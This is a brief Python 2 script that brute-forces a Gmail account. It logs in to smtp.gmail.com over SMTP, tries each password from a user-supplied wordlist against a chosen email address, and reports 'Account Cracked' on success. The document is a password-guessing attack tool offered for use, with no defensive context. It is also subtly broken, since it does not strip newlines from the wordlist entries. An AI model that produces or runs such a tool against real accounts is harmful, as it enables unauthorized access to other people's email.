import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Please enter the email adress: ")
passwfile = raw_input("Enter the password list: ")
passwfile = open(passwfile, "r")

for password in passwfile:
        try:
                smtpserver.login(user, password)

                print "[+] Account Cracked : %s" % password
                break; 
        except smtplib.SMTPAuthenticationError:
                print "[!] Password Incorrect :( : %s" % password﻿
